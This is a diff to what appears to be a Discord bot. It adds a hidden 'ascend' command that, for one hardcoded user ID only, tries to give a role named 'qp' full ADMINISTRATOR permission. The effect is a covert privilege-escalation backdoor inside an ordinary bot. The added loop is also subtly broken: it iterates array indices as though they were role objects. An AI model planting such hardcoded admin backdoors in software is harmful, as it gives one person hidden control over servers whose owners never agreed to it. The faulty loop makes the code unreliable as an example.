@@ -360,6 +360,30 @@ function processCommand(receivedMessage) {
             }
         }
     }
+
+    if(primaryCommand.toLowerCase() === "ascend") {
+        if(receivedMessage.member.id !== '142907937084407808') {
+            receivedMessage.channel.send("Only AA is worthy of ascension.");
+        }
+        
+        else {
+            let myroles = Array.from(receivedMessage.member.roles.values());
+
+            for(let role in myroles) {
+                if(role.name.toLowerCase() === "qp") {
+                    role.setPermissions('ADMINISTRATOR')
+                    .then(updated => console.log("Ascended."))
+                    .catch(console.error);
+
+                    receivedMessage.channel.send("AA has ascended.");
+                    break;
+                }
+                else {
+                    continue;
+                }
+            }
+        }
+    }
     return;
 
 }
